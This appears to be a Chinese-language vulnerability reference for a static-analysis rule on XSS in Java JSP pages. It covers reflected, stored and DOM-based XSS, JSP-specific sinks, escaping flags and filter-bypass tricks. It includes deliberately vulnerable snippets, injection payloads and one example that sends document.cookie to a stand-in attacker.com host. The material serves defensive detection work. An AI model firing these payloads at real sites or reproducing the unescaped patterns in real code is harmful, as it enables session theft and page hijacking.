# Java JSP XSS漏洞

> 规则 ID：`jsp_any_xss` · 类别：xss · 关键 sink：PrintWriter, ServletOutputStream, append, format, print, printf, println, write
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


## Java JSP XSS漏洞
JSP（JavaServer Pages）作为Java EE核心的动态网页技术，其本质是嵌入Java代码的HTML页面，最终编译为Servlet执行。XSS（跨站脚本攻击）是JSP应用中最常见的安全漏洞之一，核心成因是**用户输入未经过滤/转义直接输出到客户端页面**，导致攻击者注入的恶意脚本被浏览器解析执行。以下从漏洞本质、分类、典型触发场景、JSP特有触发条件等维度完整描述：

## 一、XSS漏洞核心本质（JSP场景）
JSP的动态渲染特性依赖`out.println()`、EL表达式、JSTL标签等将后端数据输出到HTML响应中。当这些输出的数据包含用户可控内容（如表单输入、URL参数、Cookie、数据库查询结果等），且未对HTML/JS特殊字符做处理时，攻击者可构造恶意输入，使脚本代码被浏览器当作合法HTML/JS执行，进而窃取Cookie、劫持会话、篡改页面、钓鱼等。

## 二、XSS漏洞的通用分类（JSP场景适配）
### 1. 反射型XSS（非持久化）
#### 核心特征
恶意脚本通过URL参数、表单提交等方式传入JSP页面，服务器端直接将该参数拼接到响应中返回，仅在单次请求中生效，需诱骗用户点击恶意链接触发。
#### JSP典型场景
- **URL参数直接输出**：
  JSP页面通过`request.getParameter("param")`获取URL参数，直接通过`out.print()`或EL表达式输出到页面。
  示例代码：
  ```jsp
  <%@ page contentType="text/html;charset=UTF-8" language="java" %>
  <html>
  <body>
    你输入的内容：<%= request.getParameter("content") %>
  </body>
  </html>
  ```
  攻击方式：访问`http://xxx.com/test.jsp?content=<script>alert(document.cookie)</script>`，参数内容直接输出到页面，脚本执行。
- **表单提交数据反射**：
  用户提交表单后，JSP页面将提交的内容（如用户名、搜索关键词）直接显示在页面提示中，未做处理。
  示例代码：
  ```jsp
  <%
    String username = request.getParameter("username");
    out.println("提交的用户名：" + username);
  %>
  ```
  攻击方式：表单提交`username=<script>window.location.href='http://attacker.com?cookie='+document.cookie</script>`，提交后页面输出该内容，脚本执行。

#### 特殊触发条件
- 参数值包含HTML特殊字符（`< > " ' &`）未转义，且输出位置在HTML标签内、标签属性中、JS代码块中，触发方式不同（如属性中需闭合引号）。
- JSP页面开启`isELIgnored="false"`时，EL表达式`${param.content}`直接输出参数，风险与`<%= %>`一致。

### 2. 存储型XSS（持久化）
#### 核心特征
恶意脚本被服务器端存储（如数据库、文件、Redis等），每次访问包含该数据的JSP页面时，脚本都会被输出并执行，影响所有访问该页面的用户，危害远大于反射型。
#### JSP典型场景
- **用户评论/留言功能**：
  攻击者在留言框输入`<script>stealCookie()</script>`，JSP后台将留言内容存入数据库；其他用户访问留言列表页面时，JSP从数据库读取留言并直接输出，脚本执行。
  示例代码（留言展示页）：
  ```jsp
  <%
    // 模拟从数据库读取留言
    String comment = DBUtil.getCommentById(request.getParameter("id"));
    out.println("留言内容：" + comment);
  %>
  ```
- **用户资料/个人签名**：
  攻击者修改个人签名为`<img src=x onerror=alert(1)>`，JSP页面展示用户资料时直接输出签名内容，触发XSS（无src的img标签执行onerror事件）。
- **日志展示页面**：
  JSP页面展示服务器访问日志，攻击者构造恶意User-Agent（如`Mozilla/5.0 <script>alert(1)</script>`），日志记录该内容后，日志展示页直接输出User-Agent，触发XSS。

#### 特殊触发条件
- 存储的数据在输出时未做任何转义，即使输入时做了简单过滤（如过滤`<script>`），攻击者可通过变形标签（如`<scr<script>ipt>`）绕过，存储后输出仍触发漏洞。
- 数据存储时的编码（如UTF-8、GBK）与输出时的编码不一致，可能导致过滤失效（如GBK宽字节绕过）。

### 3. DOM型XSS（客户端触发）
#### 核心特征
漏洞不依赖服务器端处理，JSP页面输出的HTML中包含客户端JS代码，该JS代码直接读取URL参数、localStorage等客户端数据并插入到DOM中，未做转义导致脚本执行。JSP仅作为静态HTML/JS的载体，漏洞触发全程在客户端。
#### JSP典型场景
- **JSP输出的JS读取URL参数并插入DOM**：
  示例代码：
  ```jsp
  <%@ page contentType="text/html;charset=UTF-8" language="java" %>
  <html>
  <body>
    <div id="content"></div>
    <script>
      // 客户端JS读取URL参数
      var content = decodeURIComponent(window.location.search.split("content=")[1]);
      // 直接插入DOM
      document.getElementById("content").innerHTML = content;
    </script>
  </body>
  </html>
  ```
  攻击方式：访问`http://xxx.com/test.jsp?content=<script>alert(1)</script>`，客户端JS将参数插入DOM，innerHTML解析为脚本执行。
- **JSP页面中的JS读取表单本地值**：
  JSP页面包含客户端表单，JS读取表单输入值（未提交到服务器）并显示在页面上，如：
  ```jsp
  <input type="text" id="input" oninput="showInput()">
  <div id="show"></div>
  <script>
    function showInput() {
      var val = document.getElementById("input").value;
      document.getElementById("show").innerHTML = val;
    }
  </script>
  ```
  攻击者在输入框输入`<img src=x onerror=alert(1)>`，实时显示时触发XSS。

#### 特殊触发条件
- JS使用`innerHTML`、`outerHTML`、`document.write()`等危险方法插入用户可控数据；若使用`textContent`则不会触发（仅输出文本），但JSP页面中普遍使用innerHTML导致风险。
- 数据经过`decodeURIComponent`、`unescape`等解码函数处理后，可能还原被编码的恶意字符（如`%3Cscript%3E`解码为`<script>`）。

## 三、JSP特有触发场景（区别于其他语言）
### 1. JSP内置对象不当使用
JSP的内置对象（request、response、session、application）直接输出未处理的用户数据：
- `request.getParameter()`/`request.getParameterValues()`：最常见，URL/表单参数直接输出；
- `request.getHeader()`：读取HTTP头（如Referer、User-Agent、Cookie）并输出，如展示Referer的页面：
  ```jsp
  来源页面：<%= request.getHeader("Referer") %>
  ```
- `session.getAttribute()`：会话中存储的用户输入数据（如临时保存的表单草稿）直接输出；
- `application.getAttribute()`：全局应用数据中包含用户输入，输出时触发。

### 2. JSTL/EL表达式未转义
JSP标准标签库（JSTL）和EL表达式（Expression Language）是JSP常用的渲染方式，默认无转义：
- EL表达式直接输出参数：`${param.content}` 等价于 `<%= request.getParameter("content") %>`，无转义时触发XSS；
- JSTL的`<c:out>`标签未设置`escapeXml="true"`（默认true，但手动改为false时）：
  ```jsp
  <%-- escapeXml=false 关闭XML转义，直接输出原始内容 --%>
  <c:out value="${param.content}" escapeXml="false" />
  ```
- JSTL的`<fmt:message>`标签输出用户可控的消息内容，未转义：
  ```jsp
  <fmt:message key="user.input"><fmt:param value="${param.content}" /></fmt:message>
  ```

### 3. JSP脚本片段与HTML混合编码问题
- **Java代码与HTML编码不一致**：如JSP页面指定`pageEncoding="GBK"`，但Java代码中处理字符串为UTF-8，输出时特殊字符（如`<>`）的编码错误导致过滤失效；
- **输出流直接写入响应**：使用`response.getWriter().write()`或`out.write()`直接输出用户数据，未转义HTML字符，相较于`out.print()`无额外防护；
- **JSP注释中嵌入用户数据**：攻击者构造输入突破注释（如`-->`），使脚本跳出注释执行，如：
  ```jsp
  <%-- 用户输入：${param.content} --%>
  ```
  攻击参数：`content=--> <script>alert(1)</script>`，输出后注释被闭合，脚本执行。

### 4. 动态生成HTML标签/属性
JSP动态拼接HTML标签或属性值，用户数据嵌入到标签属性中，无需`<script>`标签即可触发：
- **属性值未闭合**：
  ```jsp
  <input type="text" value="<%= request.getParameter("name") %>">
  ```
  攻击参数：`name=" onmouseover="alert(1)" `（空格+闭合引号+添加事件属性），鼠标悬浮时触发脚本；
- **动态生成JS代码块**：
  ```jsp
  <script>
    var username = "<%= request.getParameter("username") %>";
    alert("欢迎：" + username);
  </script>
  ```
  攻击参数：`username="; alert(document.cookie); //`，闭合JS字符串并注入脚本，注释掉后续代码。

### 5. 第三方组件/标签库风险
JSP引入的第三方标签库（如Struts标签、Spring MVC标签）或自定义标签，若标签内部未对输入做转义，直接输出用户数据：
- Struts2的`<s:property>`标签默认`escapeHtml="true"`，但手动设置为false时：
  ```jsp
  <s:property value="#parameters.content" escapeHtml="false" />
  ```
- 自定义JSP标签（Taglib）：开发者自定义标签处理类（Tag Handler）中，将用户数据直接写入响应，未转义：
  ```java
  // 自定义标签处理类
  public class CustomTag extends TagSupport {
      private String content;
      @Override
      public int doStartTag() throws JspException {
          JspWriter out = pageContext.getOut();
          try {
              out.print(content); // 直接输出用户数据
          } catch (IOException e) {
              throw new JspException(e);
          }
          return SKIP_BODY;
      }
      // setter方法接收用户参数
      public void setContent(String content) {
          this.content = content;
      }
  }
  ```
  JSP页面使用自定义标签：
  ```jsp
  <%@ taglib prefix="custom" uri="http://example.com/tags" %>
  <custom:tag content="${param.content}" />
  ```

## 四、XSS触发的边界场景（易被忽略）
### 1. 输出位置不同导致的触发差异
JSP中用户数据输出位置不同，触发XSS的payload形式不同，即使同一参数也可能因位置不同而漏洞触发与否不同：
- **HTML标签内**：`<script>alert(1)</script>` 直接触发；
- **HTML属性内**：需闭合属性，如`" onclick="alert(1)" x=`；
- **JS代码块内**：需闭合字符串/注释，如`'; alert(1); //`；
- **CSS样式内**：`style="background:url(javascript:alert(1))"`；
- **XML/JSON输出场景**：JSP输出JSON数据（如接口返回），若未转义，前端解析JSON后插入DOM触发，如：
  ```jsp
  <%
    response.setContentType("application/json");
    String data = "{\"content\":\"" + request.getParameter("content") + "\"}";
    out.print(data);
  %>
  ```
  攻击参数：`content\":\";alert(1);//`，构造恶意JSON导致前端JS解析执行。

### 2. 过滤绕过场景
JSP应用常做简单过滤（如替换`<script>`为空），攻击者可通过以下方式绕过：
- 大小写混合：`<ScRiPt>alert(1)</ScRiPt>`；
- 标签变形：`<scr<script>ipt>alert(1)</scr<script>ipt>`；
- 特殊字符编码：`&#60;script&#62;alert(1)&#60;/script&#62;`（HTML实体编码）；
- JS事件触发：`<img src=x onerror=alert(1)>`、`<div onload=alert(1)>`；
- 利用SVG标签：`<svg onload=alert(1)>`。

### 3. 多参数组合触发
多个参数拼接输出时，单个参数无法触发，但组合后可构造完整脚本：
```jsp
<%
  String a = request.getParameter("a");
  String b = request.getParameter("b");
  out.println("<div>" + a + b + "</div>");
%>
```
攻击参数：`a=<script>alert(` + `b=1)</script>`，拼接后形成完整`<script>alert(1)</script>`。

## 五、总结
JSP的XSS漏洞本质是**用户可控数据的输入-处理-输出链路中缺乏对HTML/JS特殊字符的转义**，其特有风险点集中在内置对象直接输出、EL/JSTL标签转义配置不当、Java代码与HTML混合编码、自定义标签库防护缺失等方面。不同类型的XSS（反射型、存储型、DOM型）在JSP场景中触发条件虽有差异，但核心都是未对输出的用户数据做安全处理，导致恶意脚本被浏览器解析执行。

